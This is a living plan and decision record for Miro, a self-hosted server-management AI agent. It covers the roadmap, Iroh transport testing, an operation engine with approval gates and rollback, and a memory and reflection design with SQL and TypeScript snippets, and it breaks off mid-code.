# Miro - Working Plan & Decision Record

Living document. Captures product vision, what's shipped, what's being built, and every real
decision made along the way - written for continuity across sessions, not just this one. Update
in place as work progresses; don't let this rot into a stale snapshot.

---

## Part 1 - What Miro is (the settled vision)

Stripped of the full 58-section plan (`/Users/brooklyn/Downloads/MIRO_FINAL_V1_PLAN.md`), Miro is a
bet on one narrow thing: **one AI that lives on your one self-hosted server, keeps your existing
Docker/Compose/Portainer setup as ground truth (§6), and gets progressively more trusted to act on
it.** Not a platform, not a fleet tool, not a rebuild-under-Miro OS.

### The flagship thesis (this is the actual top priority, confirmed explicitly, more than once)

**Miro learns you and your server, and gets visibly better the more you use it.** Everything else -
trust/safety, deep app knowledge, always-there reachability, personality - is in service of that,
not a competing axis. When asked directly "what's the primary reason someone would prefer Miro over
a generic agent," the answer was "all of this" - trust/safety, depth of specific knowledge,
ambient/always-there presence, and personality/companionship are not competing answers, they're
four faces of the same thing: Miro getting to know you and this specific machine.

### Non-negotiable architectural principle

**Authority to act stays fully separate from anything learned about the user.** Miro's growing
knowledge of you (e.g. "you always approve this class of low-risk action") never shortcuts an app's
own DISCOVERED→UNDERSTOOD→MANAGED→LEARNED→TRUSTED maturity ladder (§29). Confirmed explicitly,
twice, in two different grilling sessions. This is the one design constraint that overrides
convenience every time it comes up.

### Quiet competence (§3)

Three tiers: routine (invisible), worth knowing, needs attention. Most of what Miro does should be
invisible. Confirmed that tier *thresholds* (not just phrasing) should eventually personalize per
user - but this is explicitly deferred (see Part 3) since nothing proactive/notification-driven
exists yet to apply it to.

### Personality (§4)

Selected once at setup (Stage 0, already built). Communication-style learning **adapts this existing
personality's delivery over time** (verbosity, technicality, tone) based on the specific user - one
system, not a separate layer bolted on top. E.g. gets terser if the user consistently skims past
detail. The personality itself (casual/professional) never changes on its own; only how much detail
and what tone it uses within that personality shifts.

### Scope freeze (§56) - still holds, unmodified

No MiroOS, no Kubernetes, no NAS/storage-pool management, no custom backup repository/database/
container runtime/model runtime/VPN, no community extension marketplace, no native mobile app, no
huge app catalog, no hardware dashboard, no agent swarm/orchestration system, no large Miro cloud
backend, no enterprise multi-user administration. For personalization specifically: **structured
data + prompting only** - no embeddings, no fine-tuning, no custom model runtime. Every proposed
feature has to answer: *does this materially make Miro better at quietly maintaining and operating
a self-hosted server?* If not, wait.

### The golden proof (reframed from the original plan during this session)

Not "Jellyfin managed well in isolation" - **Miro setting up full media automation and acquisition**
end to end: Sonarr, Radarr, Prowlarr, qBittorrent, Jellyfin, and Portainer (bundled in, since it's
how these containers actually get managed) working together, set up from nothing. This merges what
the original plan called Stage 4 (Jellyfin) with the media slice of the original Stage 7
(self-hoster stack).

### The reordered roadmap (rewritten into `MIRO_FINAL_V1_PLAN.md` §54 this session)

| Stage | Contains | Status |
|---|---|---|
| **A. Remote access** | Iroh P2P transport only - no hosted control plane, no Cloudflare/passkeys yet | **Shipped** (see Part 2) |
| **B. Safe action** | Operation engine w/ visible plan-diffs, recovery points, rollback, lifelines, reboot recovery, SecretRef secrets | **Slice 1 shipped** (operation engine core, live-verified); lifelines/reboot recovery not started |
| **C. Memory & Learning** | §37 Memory, communication-style personality adaptation, personalized quiet-competence thresholds - unified with self-extension/Dreaming foundations | **Slice 1 shipped** (Memory + Reflexion-shaped Dreaming reflection, live-verified). **Slice 2 shipped, both phases** (self-extension: learn→generate→validate→promote, AND Dreaming's repair loop - a real induced failure was detected, self-repaired, and re-verified working, all live on the VM - see Part 4). Personalized quiet-competence thresholds not started. |
| **D. Media flagship** | Full acquisition+playback stack set up end-to-end (Sonarr/Radarr/Prowlarr/qBittorrent/Jellyfin/Portainer) | **Slice 1 in progress** (Jellyfin, adopt-existing, live discovery - see Part 5 / §5.13) |
| **E. Capstone** | Immich, remaining self-hoster stack, notification bus (ntfy-first), GitHub config backup, power/UPS | Not started |

Why this order, confirmed explicitly: remote reachability matters enough to front-load ahead of
safety fundamentals, because day-to-day usefulness - and thus how often the learning flywheel turns
- depends on not being tied to the local network.

Stage C absorbs "proactive repairs" and "stronger Dreaming" from the original plan's Stage 8, and
the self-extension/Dreaming foundations from the original Stage 6 - both pulled forward because
they're the same underlying theme as Memory ("Miro getting smarter over time"), not separate later
work.

---

## Part 2 - What's shipped

### Stage A: Remote access (Iroh transport)

Files: `packages/protocol/src/index.ts` (`IROH_ALPN`, `alpnBytes`, `PairRequestMessage`),
`apps/mirod/src/iroh.ts` (endpoint lifecycle, ticket generation, accept loop),
`apps/mirod/src/index.ts` (Iroh accept loop running alongside the existing unix socket - not
replacing it), `apps/miro/src/iroh-connect.ts` (`dialIrohTicket`), `apps/miro/src/connection.ts`
(`MIRO_TICKET` env var branches to the remote path), `/pair` slash command in `App.tsx`,
`apps/mirod/src/iroh.test.ts`.

**Real, hands-on-verified technical facts** (not just docs-read):
- `@number0/iroh@1.1.0` (npm, napi-rs native addon) works fine under Bun 1.3.14 and 1.4.0 for
  direct (same-machine) connections - proven via dozens of repeated test runs, multi-round-trip,
  multi-stream.
- **`bun build --compile --target=bun-linux-*` cannot cross-compile a binary depending on this
  package** - produces "Cannot find native binding" at runtime on the target even when the matching
  platform's npm package (`@number0/iroh-linux-arm64-gnu`) is explicitly installed locally. Confirmed
  broken on both Bun 1.3.14 and 1.4.0. The only working path found: install Bun natively on the
  target and `bun install` + `bun run` there (its own install correctly resolves the right native
  addon). This breaks the project's previously-working "cross-compile + scp" deployment pattern for
  anything depending on this package.
- `scriptc.dev` (Vercel Labs' TypeScript-to-native compiler) is **not** a viable alternative -
  its `--dynamic` mode embeds `quickjs-ng`, not a Node/Bun N-API host, so this native addon can't
  load inside it either.
- **The Iroh relay path's reliability is genuinely unresolved, not proven either way.** Real cross-
  machine data delivery over relay (via `use1-1.relay.n0.iroh.link`, across a genuine NAT boundary
  - a QEMU VM behind SLIRP NAT) was demonstrated working multiple times. But repeated testing also
  produced inconsistent failures (`ApplicationClosed`, `TransportError("authentication failed")`,
  silent hangs, `TimedOut`) that did NOT correlate cleanly with any specific code pattern once
  tested with a large enough sample - an earlier hypothesis ("loop-wrapped reads specifically hang
  under Bun over relay") did not survive re-testing; the "always reliable" bare-read pattern failed
  twice in a row under otherwise-identical conditions on a later run. Current honest state:
  **general relay-path flakiness, cause not isolated.** No GitHub issue was filed on the strength of
  the earlier overconfident characterization - it didn't hold up under more testing.
- **Decision (confirmed by user): ship Option A (persistent connection) as implemented anyway.**
  The code is real, correct, typechecks, passes all tests, and direct/local connections are fully
  reliable. Relay reliability for real remote NATed use stays an explicitly flagged open risk, to
  revisit if real usage surfaces problems - not silently assumed fixed or silently assumed broken.

### Stage B, slice 1: Operation engine core

Files: `apps/mirod/src/operations/store.ts` (operations table, phase state machine - schema below),
`apps/mirod/src/operations/engine.ts` (`OperationKind` interface, `runOperation`,
`reconcileOperations`), `apps/mirod/src/operations/kinds/systemd-restart.ts` (first real kind),
`apps/mirod/src/agent/operation-tools.ts` (`buildOperationTools` - kept separate from
`agent/tools.ts`'s read-only `AGENT_TOOLS` so `worker.ts`'s subagents never see mutating tools
without deliberate future wiring), `apps/mirod/src/secrets.ts` (generalized to `SecretRef`:
`setSecret(db, ref, value)`/`getSecret(db, ref)`, ref format `"<namespace>.<name>"` e.g.
`"provider.anthropic"`, `"transport.iroh_secret_key"` - this also collapsed the Iroh transport key's
previously-separate storage path into the same table), `packages/protocol/src/index.ts`
(`OperationPlanEvent`/`OperationResultEvent`), `tools/dev-vm/cloud-init/user-data.yaml`
(`miro-demo.service`, a zero-consequence dedicated unit for live-testing).

**Operations table schema:**
```sql
CREATE TABLE IF NOT EXISTS operations (
  id TEXT PRIMARY KEY, kind TEXT NOT NULL, goal TEXT NOT NULL, params TEXT NOT NULL,
  phase TEXT NOT NULL, auto_approve INTEGER NOT NULL DEFAULT 0,
  plan TEXT, captured_state TEXT, rollback TEXT, error TEXT,
  created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL
)
```
Phases: `planning → awaiting_confirmation? → capturing → applying → verifying → committed | rolledback`.
Durability rule: `capturing → applying` is one atomic UPDATE (captured_state + rollback + phase
together), so `phase='capturing'` on disk always means nothing was captured yet - this collapses
crash reconciliation to two cases (interrupted-before-apply → auto-rollback with no kind call
needed; mid-flight → re-verify, commit or roll back). Reconciliation never retries `apply()` - an
unknown crash point makes blind retry itself dangerous.

**Correction found during design and fixed:** `bun:sqlite`'s on-disk default journal mode is
`delete`, not WAL - §47's crash-recovery story requires WAL. Added `db.exec("PRAGMA journal_mode =
WAL")` at daemon startup; verified on the real on-disk VM database that it actually took effect
(`PRAGMA journal_mode` → `wal`).

**Bug I found and fixed in my own first draft:** if `apply()` throws, the engine must still attempt
`kind.rollback()` - apply() may have partially succeeded (e.g. stopped but didn't restart), so
leaving the system in whatever state the failure left it is wrong. Original draft skipped this;
fixed before writing tests.

**`OperationKind` interface** (the pattern every mutating capability implements):
```ts
export interface OperationKind<P = any, S = any> {
  kind: string;
  describe(params: P): Promise<OperationPlan>;      // -> { summary, autoApprove, details? }
  captureState(params: P): Promise<S>;
  apply(params: P): Promise<void>;
  verify(params: P): Promise<boolean>;
  rollback(params: P, captured: S): Promise<void>;  // best-effort, must not throw
}
```

**Visible operation plan protocol**: `operation_plan` event carries the rich display; the actual
approval gate reuses the *existing* `QuestionEvent`/`AnswerMessage` round trip (`id:
"op_confirm:<opId>"`, Approve/Cancel) - no new gating mechanism needed. Required a real
architectural gap to be closed: `ConnState` gained `pendingAnswers: Map<string, (value: string) =>
void>` so a tool's own `execute()` call can genuinely block on a human answer (`waitForAnswer`),
not just advisory text - this is what makes "dangerous requires the user" a real gate instead of a
suggestion.

**First kind, `systemd.restart`:** forces "ask" (not auto-approve) for a `LIFELINE_ADJACENT` set of
units (ssh.service, systemd-networkd.service, NetworkManager.service, tailscaled.service) since
lifelines (§39) aren't built yet - falling back to asking is the safe default for anything
network/SSH-adjacent until real lifeline machinery exists.

**Live-verified for real, independently, not just self-reported:** added `miro-demo.service` to the
QEMU dev VM's cloud-init (required wiping `tools/dev-vm/state/disk.qcow2` - cloud-init only applies
on first boot of a fresh disk). Stopped it for real (`sudo systemctl stop`). Ran `mirod` **natively
on the VM** (Bun installed there - cross-compiling still doesn't work, see above) with Ollama tunneled
in from this Mac (`ssh -R 11434:localhost:11434` - `mirod`'s `registerOllamaIfReachable` checks its
own localhost, and mirod runs on the VM while Ollama runs on the Mac). Drove a real two-turn chat
over the **local unix socket** (the still-flaky Iroh relay path hung twice during this same test,
consistent with the open Stage A finding - switched to the reliable local path instead, which is
what actually matters for verifying the operation engine):

```
› is miro-demo.service running?
[real systemd.list tool call] → "Nope, miro-demo.service is currently inactive (dead)."
› fix it
[real service.restart tool call] → operation_plan → activity×3 → operation_result{committed}
→ "Done. I gave miro-demo.service a kick and it's back up and running."
```

Independently verified outside the agent's own report: `systemctl status miro-demo.service` on the
VM showed genuinely active (11s uptime, real PID). The daemon's own `operations` table had a real
row: `phase='committed'`, `captured_state='{"active":false,"activeState":"inactive"}'` - correctly
captured the broken state before applying.

**One honest, non-bug finding from the live run:** the first attempt asked "what's wrong with this
server" generically, and the model correctly did NOT flag the inactive demo service as a problem -
a generic-looking, non-essential dev unit being down isn't inherently "wrong" without something
marking it as expected-to-run. Had to ask about the specific service by name. This is correct model
behavior, not something to fix.

**Deferred from Stage B to later slices, per the plan's own sequencing recommendation:**
- Full Restic-based recovery points - not needed yet. `captured_state`/`rollback` are plain JSON
  columns; restic isn't installed anywhere in this environment, has no JS/Bun wrapper, and no
  file/config-mutating kind exists yet to need it. A future file-mutating kind plugs Restic into the
  same `captureState`/`rollback` methods with zero engine changes when it's actually needed.
- Lifelines (§39) - needs new machinery (`saveKnownGood()`/`proveReconnect(timeoutMs)`) beyond what
  slice 1 built; a genuine remote-observer-driven "did a fresh connection survive" check, not a
  local self-check `verify()` can do today.
- Reboot recovery (§40) - almost free once reconciliation exists (a reboot is just an operation
  whose `apply()` doesn't return because the process dies, resumed by the same
  `reconcileOperations()` slice 1 already built) but the concrete `reboot` kind and "what to check
  afterward" checklist are real work not yet done.

---

## Part 3 - Shipped: Memory (§37) + Dreaming reflection loop (slice 1)

### Why this is next

Explicitly identified (by direct assessment, asked-for and honest) that the stated top priority -
Miro learning you - has zero implementation despite being the flagship, while the safety engine
(explicitly *not* the flagship) is the most-built, most-proven thing in the repo so far. This is
the correction to that imbalance.

### Confirmed via a dedicated grilling session, all of the following are fixed constraints

**Memory categories**: §37 names six - user preferences, server facts, app knowledge, incident
history, extension knowledge, research findings. Confirmed: the DB schema should support **all
six** as a category enum from day one, but **this slice only builds real write paths for user
preferences, server facts, and incident history** - the other three need capabilities that don't
exist yet (self-extension for app/extension knowledge, cached web search for research findings) and
stay schema-ready but empty until those capabilities land.

**Write path - two mechanisms, confirmed after real research grounding (see below):**
1. An explicit `memory.remember` tool the main agent can call mid-conversation - the primary path
   for models confident enough to self-direct it.
2. A **Reflexion-shaped background reflection pass** as a backstop, since (explicit user framing)
   "some AI models would be very skittish" about proactively calling a memory tool on their own
   initiative. This is NOT a generic "background job" - it's specifically grounded in real triggers
   that already exist as infrastructure:
   - An operation committing or rolling back (`operations/engine.ts`'s `runOperation`/
     `reconcileOperations`) - the "successful repair"/"failed repair" triggers from plan §36.
   - A repeated-incident pattern (queryable from the existing `operations` table - same kind
     failing/needing fixing multiple times).
   - A lightweight, explicitly imperfect user-correction heuristic (no real NLU) - confirmed wanted
     despite the lack of real NLU, per direct user request ("also attempt user-correction detection
     now" over the more conservative "defer it" option).
3. **Mechanism split, confirmed:** incident-history memory is written **mechanically**, straight
   from the operation record's own fields (kind, goal, phase, captured_state) - no extra LLM cost,
   the data already exists. Preference/pattern extraction uses a **real LLM call** - a narrow,
   budgeted background agent invocation styled on the existing `spawnWorker` pattern
   (`apps/mirod/src/agent/worker.ts`), not a new architecture.

**Read path** (confirmed, and grounded in real, existing agent-memory architecture - see research
below, not invented from scratch): a small, cheap, **always-on summary** of top facts/preferences
injected into the system prompt every turn, PLUS a **`memory.query` tool** for deeper on-demand
lookups. This is deliberately the MemGPT/Letta "core memory" (pinned, always in context) + "archival
memory" (queried via tool call) pattern.

**Inspectable/editable surface**: a **`/memory` chat command**, matching the existing `/provider`/
`/pair` slash-command pattern in `apps/miro/src/App.tsx` - not a separate CLI subcommand.

**Confidence mechanics**: **occurrence-count threshold** - a fact needs to recur N times before
being surfaced as more than tentative, shown as "you've mentioned this a few times," not a numeric
score. Deliberately simple and explainable over a decay/scoring model that would need real design
work to mean anything.

**Communication-style adaptation**: modifies the *existing* fixed personality selection over time
(one system, not a separate layer) - ties into `apps/mirod/src/agent/index.ts`'s
`systemPrompt(personality)`/`PERSONALITY_TONE`. Concrete mechanism still to be finalized by the
in-flight Plan agent (see "Still being designed" below).

**Quiet-competence tier personalization: explicitly deferred, confirmed premature for this slice.**
No proactive/notification infrastructure exists yet to apply it to - Miro currently only responds
to explicit chat, nothing surfaces autonomously. Revisit once Stage E's notification bus (or
equivalent) exists.

### Real research grounding (done this session, not assumed)

Three real precedents looked up and mapped onto this design, specifically because the user pushed
back on an initial framing that reduced "Dreaming" to just "a background memory-writer" - correctly
pointing out that §36's own worked example (FreshRSS extension breaks → Dreaming researches docs →
patches extension → tests → promotes fix) describes something bigger than memory extraction:

1. **MemGPT / Letta** (tiered agent memory: core memory = small, pinned, in-context blocks the
   agent edits via explicit tool calls; archival memory = long-term store queried via tool calls;
   recall memory = searchable conversation history). This is the direct architectural precedent for
   the "always-on summary + on-demand query tool" read path above - not invented here, a proven
   pattern for exactly this problem (see letta.com/blog/agent-memory, docs.letta.com).

2. **Reflexion** (Shinn et al., arXiv 2303.11366 - "Language Agents with Verbal Reinforcement
   Learning"): agents verbally reflect on task success/failure feedback, store that reflection in
   an episodic memory buffer, and use it to improve subsequent attempts - without any weight
   updates. This is the direct academic precedent for tying Dreaming's reflection pass to real
   success/failure signals (operation commit/rollback), and specifically validates that the
   reflection should be *generated text about what happened*, not just raw structured logging -
   worth revisiting whether incident-history writes should eventually include a short LLM-authored
   reflection on top of the mechanical field-copy, once the "repeated incident" trigger fires (cost
   discipline: cheap mechanical write on every occurrence, real reflection only when a pattern
   justifies the cost).

3. **Voyager** (Wang et al., arXiv 2305.16291 - "An Open-Ended Embodied Agent with Large Language
   Models"): an ever-growing library of *executable code skills*, generated, tested via real
   execution feedback, and self-verified, enabling genuine lifelong learning without fine-tuning.
   This is the real precedent for §33's self-extension (`extensions/freshrss/{tools.ts,
   diagnostics.ts, browser.ts, tests.ts}`) - and critically, it clarified that self-extension is a
   **fundamentally bigger, separate problem** than memory: it means the agent actually writing and
   running new code with a real test/validation pipeline, not just writing facts. This directly
   informed the scope-split decision below.

### Scope-split decision (confirmed)

"Dreaming" spans two genuinely different-sized problems, both real, both eventually needed, but not
the same slice of work:

- **The Reflexion-shaped reflection loop that writes Memory** - well-precedented, buildable now on
  infrastructure (the operations table, the timeline) that already exists and already has real
  data. **This is what slice 1 (this document's Part 3) builds.**
- **The Voyager-shaped self-extension skill library** (§32-35 - extension host, SDK, code
  generation, browser-to-extension learning, validation pipeline) - a much bigger, riskier, separate
  system. **Confirmed explicitly: this becomes its own separate, later slice within Stage C**, not
  bundled into this one. Same pattern as Stage B splitting lifelines/reboot-recovery into their own
  later slices rather than attempting everything in slice 1.

The earlier "unify Memory and self-extension" decision (from the big product-alignment grilling
session) was about roadmap *ordering* - both pulled forward together, ahead of the media flagship -
not about building both in one implementation pass.

### Technical design (Plan agent output, appended verbatim)

I read the existing code end to end: `operations/store.ts` + `engine.ts` (+ their tests),
`agent/worker.ts`, `agent/operation-tools.ts`, `agent/tools.ts`, `agent/index.ts` (+ its test),
`secrets.ts`, `timeline.ts`, `packages/protocol/src/index.ts`, `apps/miro/src/App.tsx`, and
`PLAN.md`'s Part 3 (which already locks in everything the prompt states, plus one detail worth
flagging up front).

**One correction to the brief, grounded in PLAN.md itself (line 268-272, the "research grounding"
note at line 317-320):** the LLM reflection call should **not** fire on every operation
commit/rollback - the plan's own Reflexion research note says "cheap mechanical write on every
occurrence, real reflection **only when a pattern justifies the cost**." So the design below fires
the LLM call on only two triggers (repeated-incident pattern, user-correction), while the mechanical
write fires on every terminal operation. This is cheaper and matches what's already written down.

**A real architectural constraint I found and designed around:** `operations/engine.ts` cannot
import anything from `agent/` - `agent/worker.ts` → `agent/index.ts` → `agent/operation-tools.ts` →
`operations/engine.ts` is already a live import chain, so `engine.ts` importing `spawnWorker` would
be circular. Fixed by having `engine.ts` depend only on the new `memory/store.ts` (a leaf module, no
`agent/` dependency) and take a plain `reflect` callback on `OperationToolContext` - exactly the
same shape as the existing `send`/`waitForAnswer` callbacks. `index.ts` (the composition root) wires
that callback to a new `memory/dreaming.ts`, which is free to import `spawnWorker`.

#### 1. Memory table schema

`apps/mirod/src/memory/store.ts`, following `operations/store.ts` exactly (camelCase interface,
snake_case `Row`, `fromRow`, plain `bun:sqlite`, no ORM):

```sql
CREATE TABLE IF NOT EXISTS memories (
  id TEXT PRIMARY KEY,
  category TEXT NOT NULL,
  key TEXT NOT NULL,
  value TEXT NOT NULL,
  source TEXT NOT NULL,
  version_applicability TEXT,
  occurrence_count INTEGER NOT NULL DEFAULT 1,
  created_at INTEGER NOT NULL,
  last_seen_at INTEGER NOT NULL,
  last_verified_at INTEGER NOT NULL,
  UNIQUE(category, key)
)
```

```ts
export type MemoryCategory =
  | "preference" | "server_fact" | "incident"       // written this slice
  | "app_knowledge" | "extension_knowledge" | "research"; // schema-ready, empty

export const WRITABLE_MEMORY_CATEGORIES = ["preference", "server_fact", "incident"] as const;

export interface MemoryRecord {
  id: string;
  category: MemoryCategory;
  key: string;                    // short stable slug, scoped by category - no dotted-namespace
  value: string;                  // human-readable fact
  source: string;                 // "agent_tool" | "reflection" | "mechanical:<opKind>"
  versionApplicability: string | null;
  occurrenceCount: number;
  createdAt: number;
  lastSeenAt: number;
  lastVerifiedAt: number;
}
```

`confidence` is **deliberately not a stored column** - it's derived at read time from
`occurrenceCount` via a pure function, so there's no second source of truth to keep in sync on every
upsert:

```ts
export function confidenceLabel(n: number): "tentative" | "noted a few times" | "confirmed" {
  if (n >= 4) return "confirmed";
  if (n >= 2) return "noted a few times";
  return "tentative";
}
```

`key` is a genuine second column, not a dotted `SecretRef`-style string - `category` already is the
namespace column (used for filtering/grouping), so collapsing it into one dotted string would just
mean re-parsing it back out everywhere `/memory` groups by category. This is a deliberate, stated
divergence from `SecretRef`'s convention.

Same-fact reinforcement uses the exact `ON CONFLICT ... DO UPDATE SET ... = excluded....` idiom
`secrets.ts` already uses, targeting the `(category, key)` unique index (not the PK) so the row's
`id` stays stable across reinforcements:

```ts
export function remember(
  db: Database, category: MemoryCategory, key: string, value: string,
  source: string, versionApplicability: string | null = null,
): MemoryRecord {
  const now = Date.now();
  db.run(
    `INSERT INTO memories (id, category, key, value, source, version_applicability, occurrence_count, created_at, last_seen_at, last_verified_at)
     VALUES (?, ?, ?, ?, ?, ?, 1, ?, ?, ?)
     ON CONFLICT(category, key) DO UPDATE SET
       value = excluded.value, source = excluded.source, version_applicability = excluded.version_applicability,
       occurrence_count = occurrence_count + 1, last_seen_at = excluded.last_seen_at, last_verified_at = excluded.last_verified_at`,
    [crypto.randomUUID(), category, key, value, source, versionApplicability, now, now, now],
  );
  return getByKey(db, category, key)!;
}
```

Other functions in `memory/store.ts`: `ensureMemoryTable(db)`, `getByKey(db, category, key)`,
`query(db, {category?, keyword?, limit?})` (keyword LIKE over key/value), `listAll(db, limit?)`,
`topFacts(db, limit)` (the always-on-summary source), `buildSummary(db)`, `recordIncident(db,
{kind, goal, phase, error})` (mechanical wrapper around `remember`), `forget(db, idOrPrefix)`,
`formatForDisplay(records)`.

`recordIncident`'s key is `incident.<kind>.<slug(goal)>` (goal already encodes the target, e.g.
"restart jellyfin.service" → key includes it), so repeated incidents against the same target
accumulate on one row via the same upsert path, while different targets get separate rows.
`occurrenceCount` on an incident row conflates commit+rollback outcomes into one "how often does
this happen" tally rather than segmenting by outcome - a deliberate simplification (ponytail:
outcome-segmented keys would double the row count for a threshold-of-2 heuristic that doesn't need
that precision; the *repeated-failure* signal that matters for triggering reflection comes from
`operations`, not from this row, see §5).

#### 2. `memory.remember` tool

New file `apps/mirod/src/agent/memory-tools.ts`, shaped exactly like `operation-tools.ts`'s
`buildOperationTools(ctx)` but `buildMemoryTools(db)` (mutating but not a tracked *operation* - no
plan/confirm/rollback semantics apply to Miro's own notes, so it doesn't go through `runOperation`):

```ts
const rememberParams = Type.Object({
  category: Type.Union([Type.Literal("preference"), Type.Literal("server_fact"), Type.Literal("incident")]),
  key: Type.String({ description: "Short stable slug for the fact's subject, e.g. 'reply_style' or 'backup_schedule.postgres'. Reuse the same key when this exact fact recurs - use 'reply_style' for communication-style preferences." }),
  value: Type.String({ description: "The fact itself, one sentence, human-readable." }),
});
```

`execute` calls `memory.remember(db, category, key, value, "agent_tool")` and returns `{ saved:
true, occurrenceCount, confidence: confidenceLabel(occurrenceCount) }` - the model gets told "noted
(confirmed, 4th time)"-style feedback, useful for it to know reinforcement happened rather than a
silent duplicate.

Same (category, key) called again → **increment**, not a new row (the upsert above). Different key
→ new row. No dedicated `memory.forget` tool this slice - forgetting is a human-only action via
`/memory forget` (§6); giving the model unattended delete power isn't needed here and keeps the
tool's blast radius small.

Wired into `createMiroAgent` alongside `buildOperationTools`, reusing `operationCtx.db` (no
signature change to `createMiroAgent`):
```ts
const tools = [...AGENT_TOOLS, ...(operationCtx ? buildOperationTools(operationCtx) : []), ...(operationCtx ? buildMemoryTools(operationCtx.db) : [])];
```
Not added to `AGENT_TOOLS` (that's the read-only set `spawnWorker` draws from) and not exposed to
investigation workers - matches the existing "authority stays separate" boundary already drawn
between `tools.ts` and `operation-tools.ts`.

#### 3. `memory.query` tool

Same file, second export in `buildMemoryTools`:
```ts
const queryParams = Type.Object({
  category: Type.Optional(Type.Union([Type.Literal("preference"), Type.Literal("server_fact"), Type.Literal("incident"),
    Type.Literal("app_knowledge"), Type.Literal("extension_knowledge"), Type.Literal("research")])),
  keyword: Type.Optional(Type.String({ description: "Filter by text in the key or value." })),
});
```
`execute` → `memory.query(db, { category: params.category, keyword: params.keyword, limit: 20 })`,
returns each record with `confidence: confidenceLabel(occurrenceCount)` substituted for the raw
count (mirrors the summary's verbal framing, not a numeric score, per the confidence-mechanics
requirement). All six categories are offered (schema-ready), even though three currently return
nothing.

#### 4. Always-on summary

Lives in `memory/store.ts` (`buildSummary(db)`), MemGPT-style split:
- **Core memory** (always-on summary): `category IN ('preference','server_fact')`, `ORDER BY
  occurrence_count DESC, last_seen_at DESC LIMIT 8` - a hard `LIMIT 8` bounds prompt growth
  structurally regardless of how large the table gets, not "by convention."
- **Archival memory** (everything else, including `incident`): only reachable via `memory.query`.
- The `reply_style` key (see §7) is excluded from the summary's `WHERE` clause so it isn't shown
  twice (once as a tone instruction, once as a bullet).

```ts
export function buildSummary(db: Database): string {
  const rows = topFacts(db, 8);
  if (rows.length === 0) return "";
  const lines = rows.map((r) => `- ${r.value} (${confidenceLabel(r.occurrenceCount)})`);
  return `What you've learned about this user and server so far:\n${lines.join("\n")}`;
}
```

**Injection + freshness:** `agent/index.ts`'s `systemPrompt` gains two more params (§7 covers the
first):
```ts
export function systemPrompt(personality: Personality, learnedStyle: string | null = null, memorySummary = ""): string
```
`createMiroAgent` computes both from `operationCtx.db` when present. The tricky bit: `index.ts` only
rebuilds `state.agent` when the model id changes (line 100), so a summary baked in at
agent-construction time would go stale for the rest of a long-lived connection - directly
undercutting "gets visibly better as you use it." Rather than risk mutating `agent.state` mid-session
(unverified whether `pi-agent-core` supports that safely - no evidence either way in this codebase),
the fix reuses the **existing** rebuild-on-change pattern: compute the summary (cheap, indexed
`LIMIT 8` read) on every chat message, compare against `state.lastMemorySummary`, and rebuild the
agent when it differs, exactly like the model-id check already does. `ConnState` gains
`lastMemorySummary?: string`.

#### 5. Dreaming reflection pass

**Mechanical incident write - every terminal operation, no LLM.** In `operations/engine.ts`, factor
a local closure inside `runOperation`:
```ts
function onTerminal(kindName: string, goal: string, outcome: "committed" | "rolledback", message: string) {
  memory.recordIncident(db, { kind: kindName, goal, phase: outcome, error: outcome === "rolledback" ? message : null });
  if (outcome === "rolledback") {
    const repeatFailureCount = store.countByKindAndPhase(db, kindName, "rolledback");
    if (repeatFailureCount >= REPEAT_FAILURE_THRESHOLD) {
      ctx.reflect?.({ kind: kindName, goal, outcome, message, repeatFailureCount });
    }
  }
}
```
Called at the **3** exit points where something actually happened to the server - apply-failed
rollback, verify-failed rollback, committed - via `onTerminal(kind.kind, goal, outcome, message)`
right before each existing `return`. **Not** called at the user-cancellation branch (line 55-58):
`captureState` never ran there, there's no server-state fact to log, and `timeline.ts` already
covers "the user said no" as a chat event.

`OperationToolContext` gains one new **optional** field (so `engine.test.ts`'s existing `fakeCtx`
keeps compiling untouched):
```ts
export interface ReflectionTrigger { kind: string; goal: string; outcome: "committed" | "rolledback"; message: string; repeatFailureCount: number; }
export interface OperationToolContext { db: Database; send: ...; waitForAnswer: ...; reflect?: (trigger: ReflectionTrigger) => void; }
```
`ctx.reflect?.(...)` is called **without `await`** - fire-and-forget, never blocks the user-facing
`operation_result`.

**Repeated-incident detection** - new query in `operations/store.ts` (data source is `operations`,
exactly as specified):
```ts
export function countByKindAndPhase(db: Database, kind: string, phase: OperationPhase): number {
  const row = db.query(`SELECT COUNT(*) as n FROM operations WHERE kind = ? AND phase = ?`).get(kind, phase) as { n: number };
  return row.n;
}
```
`REPEAT_FAILURE_THRESHOLD = 2` (a named constant in `engine.ts`). No time window - counts all-time
rollbacks for that kind. `ponytail: no recency cutoff - an old, long-resolved incident stays in the
tally forever; add a sinceMs window if stale incidents start triggering reflection.`

**`reconcileOperations`** (crash recovery) gets the **mechanical** write only, at its two real
terminal transitions (mid-flight → committed / mid-flight → rolledback), calling
`memory.ensureMemoryTable(db)` at its top the same defensive way it already calls
`store.ensureOperationsTable(db)`. The "interrupted before anything happened" loop (still in
`planning`/`awaiting_confirmation`/`capturing`) is excluded for the same reason as
user-cancellation - nothing touched the server. **No `reflect` call from the reconcile path** - it
runs at boot before any client is connected and threading `model`/`getStoredKey` into it for one
background call isn't worth the signature churn this slice; stated scope cut, not a silent gap.

**The budgeted LLM reflection call** - new `apps/mirod/src/memory/dreaming.ts`, reusing
`spawnWorker` unmodified:
```ts
const WRITABLE_CATEGORIES = new Set(WRITABLE_MEMORY_CATEGORIES);
const INSTRUCTIONS = `Review the event below and decide if it reveals a durable fact worth remembering about
this user or their server - a preference, a server fact, or a pattern. Most events reveal nothing new; it's
correct to remember nothing. Respond with ONLY a JSON object, no other text:
{"remember": [{"category": "preference"|"server_fact"|"incident", "key": "short_stable_slug", "value": "one sentence"}]}
Use an empty array if there's nothing worth keeping. Keep "key" stable and generic (e.g. "reply_style",
"backup_schedule") so the same fact reinforces itself next time instead of duplicating.

Event:
`;

export async function reflectOnOperation(db, model, getStoredKey, trigger: ReflectionTrigger) {
  const context = `An operation just finished.\nGoal: ${trigger.goal}\nKind: ${trigger.kind}\nOutcome: ${trigger.outcome}\nDetail: ${trigger.message}\nThis is the ${trigger.repeatFailureCount}th time a ${trigger.kind} operation has failed - this may be a pattern worth flagging.`;
  await runReflection(db, model, getStoredKey, context);
}
export async function reflectOnCorrection(db, model, getStoredKey, previousReply: string, correction: string) {
  const context = `The user appears to have corrected Miro's previous reply.\nMiro said: ${previousReply}\nUser then said: ${correction}`;
  await runReflection(db, model, getStoredKey, context);
}
async function runReflection(db, model, getStoredKey, context: string) {
  const result = await spawnWorker(`${INSTRUCTIONS}${context}`, [], model, getStoredKey, 1); // no tools, 1 turn - pure text classification
